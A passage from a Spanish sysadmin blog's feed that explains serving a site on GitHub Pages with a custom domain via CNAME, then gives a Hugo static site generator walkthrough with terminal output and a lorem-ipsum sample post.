&lt;p&gt;Un detalle del &lt;em&gt;push&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/projects/didactic-meme$ git push origin gh-pages
Username &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;https://github.com&amp;#39;&lt;/span&gt;: sirtea
Password &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;https://sirtea@github.com&amp;#39;&lt;/span&gt;: 
Total &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, reused &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
To https://github.com/Sirtea/didactic-meme.git
 * &lt;span class="o"&gt;[&lt;/span&gt;new branch&lt;span class="o"&gt;]&lt;/span&gt;      gh-pages -&amp;gt; gh-pages
gerard@aldebaran:~/projects/didactic-meme$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y como ya tenemos las dos ramas en &lt;em&gt;GitHub&lt;/em&gt;, podemos continuar con el &lt;em&gt;setup&lt;/em&gt; de nuestro sitio. Para ello vamos a la página de nuestro repositorio y cambiamos a la pestaña &lt;em&gt;Settings&lt;/em&gt;. En esta sección existe un desplegable para elegir la rama que queremos servir como página de proyecto. Seleccionamos &lt;code&gt;gh-pages&lt;/code&gt; y guardamos.&lt;/p&gt;
&lt;p&gt;Solo nos queda visitar la dirección que nos proporcionan en la misma página de &lt;em&gt;Settings&lt;/em&gt;, y ver que ya tenemos un espacio web.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ curl https://sirtea.github.io/didactic-meme/
&amp;lt;h1&amp;gt;Hello World&amp;lt;/h1&amp;gt;
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: las páginas se sirven usando mecanismos de &lt;em&gt;caché&lt;/em&gt;, así que puede pasar algunos segundos hasta que el contenido se actualice o aparezca. Sed pacientes.&lt;/p&gt;
&lt;h2&gt;Sirviendo la página de proyecto con un dominio propio&lt;/h2&gt;
&lt;p&gt;La verdad es que la dirección que nos ha quedado no es bonita. La buena noticia es que puede ser mejor; podemos servir el contenido en un dominio propio, sin la coletilla del nombre del repositorio.&lt;/p&gt;
&lt;p&gt;El primer paso es conseguir un dominio al que tengamos acceso a los registros; vamos a tener que poner un registro &lt;em&gt;CNAME&lt;/em&gt; apuntando a &lt;em&gt;GitHub&lt;/em&gt;. Para evitar la lentitud del proceso, vamos a mostrar el caso de este &lt;em&gt;blog&lt;/em&gt;, ya configurado.&lt;/p&gt;
&lt;p&gt;Para que &lt;em&gt;GitHub&lt;/em&gt; sepa qué página de proyecto debe servir con cada dominio, nos sugieren que pongamos un fichero &lt;em&gt;CNAME&lt;/em&gt; en la raíz del espacio web. Este fichero solo puede contener un dominio, y debe coincidir con el del dominio elegido.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ curl http://www.linuxsysadmin.tk/CNAME
www.linuxsysadmin.tk
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora solo falta instruir a nuestro DNS para que resuelva las peticiones contra &lt;em&gt;GitHub&lt;/em&gt;. La forma recomendada es poner un registro &lt;em&gt;CNAME&lt;/em&gt; apuntando a &lt;code&gt;&amp;lt;usuario&amp;gt;.github.io&lt;/code&gt;, dejando a su criterio donde apunta este dominio, y despreocupándonos en el caso de que esta dirección IP final cambiara.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ dig www.linuxsysadmin.tk
...  
&lt;span class="p"&gt;;;&lt;/span&gt; QUESTION SECTION:
&lt;span class="p"&gt;;&lt;/span&gt;www.linuxsysadmin.tk.      IN  A

&lt;span class="p"&gt;;;&lt;/span&gt; ANSWER SECTION:
www.linuxsysadmin.tk.   &lt;span class="m"&gt;14018&lt;/span&gt;   IN  CNAME   sirtea.github.io.
sirtea.github.io.   &lt;span class="m"&gt;2394&lt;/span&gt;    IN  CNAME   github.map.fastly.net.
github.map.fastly.net.  &lt;span class="m"&gt;20&lt;/span&gt;  IN  A   &lt;span class="m"&gt;151&lt;/span&gt;.101.120.133
...  
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Cada vez que pidamos nuestro dominio, &lt;em&gt;GitHub&lt;/em&gt; se va a encargar a servir la página de proyecto que corresponde a ese dominio, cosa que sabe porque el fichero &lt;em&gt;CNAME&lt;/em&gt; se lo indica. con esto nos queda una dirección mas bonita en el navegador web.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ curl -s http://www.linuxsysadmin.tk/ &lt;span class="p"&gt;|&lt;/span&gt; head
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html &lt;span class="nv"&gt;lang&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;es&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;prefix&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;og: http://ogp.me/ns# fb: https://www.facebook.com/2008/fbml&amp;quot;&lt;/span&gt;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;Linux Sysadmin&amp;lt;/title&amp;gt;
    &amp;lt;!-- Using the latest rendering mode &lt;span class="k"&gt;for&lt;/span&gt; IE --&amp;gt;
    &amp;lt;meta http-equiv&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;X-UA-Compatible&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;IE=edge&amp;quot;&lt;/span&gt;&amp;gt;
    &amp;lt;meta &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&amp;gt;
    &amp;lt;meta &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;viewport&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&lt;/span&gt;&amp;gt;


gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, si solicitamos la dirección anterior, &lt;em&gt;GitHub&lt;/em&gt; nos devuelve una redirección al nuevo dominio, ya que asume que es la dirección "oficial".&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ curl -i http://sirtea.github.io/www.linuxsysadmin.tk/
HTTP/1.1 &lt;span class="m"&gt;301&lt;/span&gt; Moved Permanently
...  
Location: http://www.linuxsysadmin.tk/
...  

&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;301 Moved Permanently&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body &lt;span class="nv"&gt;bgcolor&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;white&amp;quot;&lt;/span&gt;&amp;gt;
&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;301 Moved Permanently&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;
&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;nginx&amp;lt;/center&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Páginas personales&lt;/h2&gt;
&lt;p&gt;Las páginas personales son las que se encargan de servir las direcciones tipo &lt;code&gt;&amp;lt;http|https&amp;gt;://&amp;lt;usuario&amp;gt;.github.io/&lt;/code&gt;, sin la coletilla del proyecto.&lt;/p&gt;
&lt;p&gt;El funcionamiento es el mismo, con dos excepciones:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;El repositorio debe llamarse igual que el dominio (&lt;code&gt;&amp;lt;usuario&amp;gt;.github.io&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;La rama que se sirve SIEMPRE es la rama &lt;code&gt;master&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Entonces solo hace falta cargar esa rama de contenido &lt;strong&gt;HTML&lt;/strong&gt;. De hecho, el truco del &lt;em&gt;CNAME&lt;/em&gt; también funciona.&lt;/p&gt;</content><category term="git"></category><category term="github"></category><category term="github pages"></category><category term="html"></category></entry><entry><title>Generadores de contenido web estáticos</title><link href="http://www.linuxsysadmin.ml/2017/03/generadores-de-contenido-web-estaticos.html" rel="alternate"></link><published>2017-03-13T10:00:00+01:00</published><updated>2017-03-13T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-03-13:/2017/03/generadores-de-contenido-web-estaticos.html</id><summary type="html">&lt;p&gt;Antes de la masiva invasión de &lt;strong&gt;PHP&lt;/strong&gt; y &lt;strong&gt;mysql&lt;/strong&gt; en todos los proveedores de internet, existían solamente las páginas &lt;strong&gt;HTML&lt;/strong&gt; estáticas. Los servidores eran más simples y tenían menos superficie de ataque, aunque mantener las páginas web era un auténtica pesadilla; para eso se han creado los generadores web estáticos …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Antes de la masiva invasión de &lt;strong&gt;PHP&lt;/strong&gt; y &lt;strong&gt;mysql&lt;/strong&gt; en todos los proveedores de internet, existían solamente las páginas &lt;strong&gt;HTML&lt;/strong&gt; estáticas. Los servidores eran más simples y tenían menos superficie de ataque, aunque mantener las páginas web era un auténtica pesadilla; para eso se han creado los generadores web estáticos.&lt;/p&gt;
&lt;p&gt;Cuando solicitamos una página web a un servidor dinámico, existe un código fuente que se suele encargar de conseguir los datos de una base de datos y mezclarlos con un tema para generar la página, todo en tiempo de &lt;em&gt;runtime&lt;/em&gt;. Este modelo es relativamente lento y exige la existencia de una base de datos y de un procesado en el servidor, aunque suele ofrecer una bonita interfaz para añadir contenido &lt;em&gt;online&lt;/em&gt; desde casi cualquier sitio.&lt;/p&gt;
&lt;p&gt;Este modelo es muy adecuado para páginas y &lt;strong&gt;APIs&lt;/strong&gt; con un contenido rápidamente cambiante, pero para una página tipo &lt;em&gt;blog&lt;/em&gt; es poco eficiente. Si tenemos en cuenta que un &lt;em&gt;blog&lt;/em&gt; se actualiza relativamente poco, pero se lee teóricamente mucho, entonces necesitamos reducir el tiempo de &lt;em&gt;renderizado&lt;/em&gt; de la página, incluso suprimiéndolo.&lt;/p&gt;
&lt;p&gt;Sin embargo, a alguien se le ocurrió una idea nueva: ¿que pasaría si cuando un editor cambia su contenido, generara &lt;strong&gt;TODAS&lt;/strong&gt; las páginas posibles y el servidor se limitara a servir esos ficheros previamente generados?&lt;/p&gt;
&lt;p&gt;En este caso, solamente necesitaríamos un servidor web normal, como por ejemplo &lt;em&gt;Apache&lt;/em&gt; o &lt;em&gt;Nginx&lt;/em&gt;, e incluso se podría alojar gratuitamente en servicios que sirvan páginas &lt;strong&gt;HTML&lt;/strong&gt; estáticas, como por ejemplo, en &lt;em&gt;GitHub&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: La combinación de &lt;em&gt;GitHub Pages&lt;/em&gt; con el generador estático &lt;em&gt;Pelican&lt;/em&gt; es lo que utiliza este &lt;em&gt;blog&lt;/em&gt; para llegar al público general.&lt;/p&gt;
&lt;p&gt;La clave de éxito para simplificar el mantenimiento de cualquier página web consiste en separar el contenido de la presentación, de forma que un editor no necesita conocer &lt;strong&gt;HTML&lt;/strong&gt; para crear su web, mientras que un diseñador se puede limitar a crear temas. También es interesante usar un formato de ficheros para no depender de una base de datos.&lt;/p&gt;
&lt;p&gt;Con esto en mente, la mayoría de los generadores estáticos son mas o menos iguales: se trata de un &lt;em&gt;software&lt;/em&gt; que se dedica a generar todas las páginas web a partir de un contenido (normalmente en ficheros) y de unas plantillas (el tema). Como la lista es gigantesca, vamos a dejar a otros que la mantengan, pero ejemplo en &lt;a href="https://www.staticgen.com/"&gt;StaticGen - Top Open-Source Static Site Generators&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Un caso práctico con Hugo&lt;/h2&gt;
&lt;p&gt;Ojeando el &lt;em&gt;ranking&lt;/em&gt;, vemos que la lista es muy larga y elegir una de estas soluciones no es fácil. Vamos a ser prácticos: no quiero instalar &lt;strong&gt;ruby&lt;/strong&gt; en mi máquina, así que usaremos el siguiente, que es un binario solitario y no ensucia mi entorno de trabajo; además presume de ser rápido. Así pues, el candidato es &lt;a href="http://gohugo.io/"&gt;Hugo&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Otros enlaces de interés para seguir este artículo se localizan en la documentación, concretamente en &lt;a href="http://gohugo.io/overview/installing/"&gt;Installing&lt;/a&gt; y en &lt;a href="http://gohugo.io/overview/installing/"&gt;Quickstart&lt;/a&gt;. Encontraréis una buena documentación de cada aspecto del funcionamiento en la barra lateral de cualquier página de documentación.&lt;/p&gt;
&lt;h3&gt;Instalación&lt;/h3&gt;
&lt;p&gt;En mi caso, la &lt;em&gt;release&lt;/em&gt; que necesito es &lt;a href="https://github.com/spf13/hugo/releases/download/v0.18.1/hugo_0.18.1_Linux-64bit.tar.gz"&gt;https://github.com/spf13/hugo/releases/download/v0.18.1/hugo_0.18.1_Linux-64bit.tar.gz&lt;/a&gt;. Así que la descargo. El fichero comprimido lleva el binario y otros ficheros de documentación.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ tar tf hugo_0.18.1_Linux-64bit.tar.gz 
hugo_0.18.1_linux_amd64/hugo_0.18.1_linux_amd64
hugo_0.18.1_linux_amd64/README.md
hugo_0.18.1_linux_amd64/LICENSE.md
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lo descomprimimos y lo ponemos en algún lugar del &lt;em&gt;path&lt;/em&gt; por comodidad, asegurando que tiene permisos de ejecución y que lo ejecutamos sin problemas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ tar xf hugo_0.18.1_Linux-64bit.tar.gz 
gerard@aldebaran:~$ cp hugo_0.18.1_linux_amd64/hugo_0.18.1_linux_amd64 ~/bin/hugo
gerard@aldebaran:~$ chmod a+x bin/hugo 
gerard@aldebaran:~$ hugo version
Hugo Static Site Generator v0.18.1 BuildDate: &lt;span class="m"&gt;2017&lt;/span&gt;-02-14T13:43:15+01:00
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Creación de una nueva web&lt;/h3&gt;
&lt;p&gt;Nuestra nueva web necesita una estructura de carpetas muy concreta que podemos crear con un simple comando, indicando la carpeta contenedora.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace$ hugo new site site1
Congratulations! Your new Hugo site is created in /home/gerard/workspace/site1.

Just a few more steps and you&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;re ready to go:

&lt;span class="m"&gt;1&lt;/span&gt;. Download a theme into the same-named folder.
   Choose a theme from https://themes.gohugo.io/, or
   create your own with the &lt;span class="s2"&gt;&amp;quot;hugo new theme &amp;lt;THEMENAME&amp;gt;&amp;quot;&lt;/span&gt; command.
&lt;span class="m"&gt;2&lt;/span&gt;. Perhaps you want to add some content. You can add single files
   with &lt;span class="s2"&gt;&amp;quot;hugo new &amp;lt;SECTIONNAME&amp;gt;/&amp;lt;FILENAME&amp;gt;.&amp;lt;FORMAT&amp;gt;&amp;quot;&lt;/span&gt;.
&lt;span class="m"&gt;3&lt;/span&gt;. Start the built-in live server via &lt;span class="s2"&gt;&amp;quot;hugo server&amp;quot;&lt;/span&gt;.

Visit https://gohugo.io/ &lt;span class="k"&gt;for&lt;/span&gt; quickstart guide and full documentation.
gerard@aldebaran:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O de forma similar, para usar la carpeta actual:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace$ mkdir site2
gerard@aldebaran:~/workspace$ &lt;span class="nb"&gt;cd&lt;/span&gt; site2
gerard@aldebaran:~/workspace/site2$ hugo new site .
Congratulations! Your new Hugo site is created in /home/gerard/workspace/site2.

Just a few more steps and you&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;re ready to go:

&lt;span class="m"&gt;1&lt;/span&gt;. Download a theme into the same-named folder.
   Choose a theme from https://themes.gohugo.io/, or
   create your own with the &lt;span class="s2"&gt;&amp;quot;hugo new theme &amp;lt;THEMENAME&amp;gt;&amp;quot;&lt;/span&gt; command.
&lt;span class="m"&gt;2&lt;/span&gt;. Perhaps you want to add some content. You can add single files
   with &lt;span class="s2"&gt;&amp;quot;hugo new &amp;lt;SECTIONNAME&amp;gt;/&amp;lt;FILENAME&amp;gt;.&amp;lt;FORMAT&amp;gt;&amp;quot;&lt;/span&gt;.
&lt;span class="m"&gt;3&lt;/span&gt;. Start the built-in live server via &lt;span class="s2"&gt;&amp;quot;hugo server&amp;quot;&lt;/span&gt;.

Visit https://gohugo.io/ &lt;span class="k"&gt;for&lt;/span&gt; quickstart guide and full documentation.
gerard@aldebaran:~/workspace/site2$ &lt;span class="nb"&gt;cd&lt;/span&gt; ..
gerard@aldebaran:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Así nos queda el esqueleto de nuestra carpeta contenedora:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace/site1$ tree -F
.
├── archetypes/
├── content/
├── data/
├── layouts/
├── static/
├── themes/
└── config.toml

&lt;span class="m"&gt;6&lt;/span&gt; directories, &lt;span class="m"&gt;1&lt;/span&gt; file
gerard@aldebaran:~/workspace/site1$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora necesitamos un tema para &lt;em&gt;renderizar&lt;/em&gt; nuestra web. Podemos crear un tema propio siguiendo la documentación, si así lo deseamos; para no extendernos, voy a utilizar uno que ya existe y que podemos encontrar en el sitio de &lt;a href="http://themes.gohugo.io/"&gt;temas de Hugo&lt;/a&gt;. Por defecto no viene ningún tema, así que las páginas saldrían en blanco.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace/site1$ &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; themes&lt;span class="p"&gt;;&lt;/span&gt; git clone https://github.com/comfusion/after-dark&lt;span class="o"&gt;)&lt;/span&gt;
Cloning into &lt;span class="s1"&gt;&amp;#39;after-dark&amp;#39;&lt;/span&gt;...
remote: Counting objects: &lt;span class="m"&gt;542&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
remote: Total &lt;span class="m"&gt;542&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, reused &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, pack-reused &lt;span class="m"&gt;542&lt;/span&gt;
Receiving objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;542&lt;/span&gt;/542&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="m"&gt;6&lt;/span&gt;.26 MiB &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;941&lt;/span&gt;.00 KiB/s, &lt;span class="k"&gt;done&lt;/span&gt;.
Resolving deltas: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;296&lt;/span&gt;/296&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
Checking connectivity... &lt;span class="k"&gt;done&lt;/span&gt;.
gerard@aldebaran:~/workspace/site1$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si miramos en la carpeta &lt;code&gt;themes/&lt;/code&gt;, veremos que ha aparecido una nueva carpeta con el tema deseado; el nombre de la carpeta es el parámetro que vamos a usar para indicar que tema usaremos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace/site1$ ls themes/
after-dark
gerard@aldebaran:~/workspace/site1$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es un buen momento para modificar la configuración del sitio, siendo especialmente importante indicar el tema a usar. Si no lo hacemos, tendremos que indicarlo como parámetro cada vez que invoquemos el resto de comandos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace/site1$ cat config.toml 
&lt;span class="nv"&gt;languageCode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;en-us&amp;quot;&lt;/span&gt;
&lt;span class="nv"&gt;title&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;My New Hugo Site&amp;quot;&lt;/span&gt;
&lt;span class="nv"&gt;baseurl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://example.org/&amp;quot;&lt;/span&gt;
&lt;span class="nv"&gt;theme&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;after-dark&amp;quot;&lt;/span&gt;
gerard@aldebaran:~/workspace/site1$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Para cambiar el tema de nuestra web, solo hace falta poner un tema nuevo en la carpeta &lt;code&gt;themes/&lt;/code&gt; y configurar el fichero con el nuevo tema. Esto nos permite probar temas diferentes; de hecho, todas las páginas van a ser reconstruidas con el nuevo tema. Si solo queremos ver que tal queda un tema, no hace falta modificar el fichero de configuración; con ejecutar &lt;code&gt;hugo&lt;/code&gt; con el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;--theme &amp;lt;tema&amp;gt;&lt;/code&gt; nos bastaría.&lt;/p&gt;
&lt;h3&gt;Generando contenido&lt;/h3&gt;
&lt;p&gt;La mecánica básica de trabajo es muy simple: creamos un nuevo contenido, levantamos el servidor de desarrollo y nos limitamos a ir viendo como cambia la página tal como vamos modificando y guardando el contenido.&lt;/p&gt;
&lt;p&gt;El servidor de desarrollo es una herramienta muy útil, y no hay ningún motivo por el que no esté permanentemente corriendo mientras trabajamos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Levanta un servidor web local que sirve las páginas desde memoria&lt;/li&gt;
&lt;li&gt;Reconstruye el contenido en memoria cada vez que un fichero cambia&lt;/li&gt;
&lt;li&gt;Sustituye todas las ocurrencias del parámetro &lt;code&gt;baseurl&lt;/code&gt; por &lt;code&gt;localhost&lt;/code&gt;, para su funcionamiento local&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Esto significa que se generará ningún fichero en disco. Para eso hay otros comandos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace/site1$ hugo server
Started building sites ...
Built site &lt;span class="k"&gt;for&lt;/span&gt; language en:
&lt;span class="m"&gt;0&lt;/span&gt; draft content
&lt;span class="m"&gt;0&lt;/span&gt; future content
&lt;span class="m"&gt;0&lt;/span&gt; expired content
&lt;span class="m"&gt;0&lt;/span&gt; regular pages created
&lt;span class="m"&gt;1&lt;/span&gt; other pages created
&lt;span class="m"&gt;0&lt;/span&gt; non-page files copied
&lt;span class="m"&gt;0&lt;/span&gt; paginator pages created
&lt;span class="m"&gt;0&lt;/span&gt; tags created
&lt;span class="m"&gt;0&lt;/span&gt; categories created
total in &lt;span class="m"&gt;14&lt;/span&gt; ms
Watching &lt;span class="k"&gt;for&lt;/span&gt; changes in /home/gerard/workspace/site1/&lt;span class="o"&gt;{&lt;/span&gt;data,content,layouts,static,themes&lt;span class="o"&gt;}&lt;/span&gt;
Serving pages from memory
Web Server is available at http://localhost:1313/ &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;bind&lt;/span&gt; address &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="o"&gt;)&lt;/span&gt;
Press Ctrl+C to stop
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora creamos una nueva página, por ejemplo un &lt;em&gt;post&lt;/em&gt; nuevo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace/site1$ hugo new post/lorem-ipsum.md
/home/gerard/workspace/site1/content/post/lorem-ipsum.md created
gerard@aldebaran:~/workspace/site1$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y lo editamos a placer. Me voy a limitar a usar un generador de texto &lt;em&gt;markdown&lt;/em&gt;, que se encuentra &lt;a href="https://jaspervdj.be/lorem-markdownum/"&gt;aquí&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+++
&lt;span class="nv"&gt;description&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;no description&amp;quot;&lt;/span&gt;
&lt;span class="nv"&gt;date&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2017-02-14T15:51:57+01:00&amp;quot;&lt;/span&gt;
&lt;span class="nv"&gt;title&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Gratia retia iamque&amp;quot;&lt;/span&gt;
&lt;span class="nv"&gt;tags&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;lorem&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;ipsum&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;categories&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;uncathegorized&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;draft&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;false&lt;/span&gt;
+++



&lt;span class="c1"&gt;## Mihi arguit hastam securaque face vigilans obruta&lt;/span&gt;

Lorem markdownum amoris illis, spicea, daedalus intonsum procul certo dubioque, inmitibus. Verti frondescere et natura Hymettia carmine *candidus Agenorides* perdere.

    swappableEbookHard.metaSkinNybble&lt;span class="o"&gt;(&lt;/span&gt;simmApple&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;desktopWebMouse&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; page&lt;span class="o"&gt;(&lt;/span&gt;analog_rt_regular, eSession, menu_oem&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    var &lt;span class="nv"&gt;prompt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; dns_megabit&lt;span class="o"&gt;(&lt;/span&gt;softShell&lt;span class="o"&gt;(&lt;/span&gt;duplexMediaYoutube, netiquette, fontBrouterPng&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;## Imagine sub nomine occursu&lt;/span&gt;

Parvas pater. Ter modo quassaque collo. Aequora chori nec tumulum *gemitus quibus*.

Odiumque duo, aera prolem mox silvas poteratque sagittis quoque crine fert. Longo ferarum temptaminis stagna vultum et urbe Peripha, Aeginam. Ne O acuto tam Thetis solita cognati robora sit tellure, et Alcyone moenia vitiorum. Solis iam omnes Lucina non suis *utroque novis* sagittam suo carchesia Achivi repleri ingratus quem.

&lt;span class="c1"&gt;## Iactasque caelatus me foret aequi&lt;/span&gt;

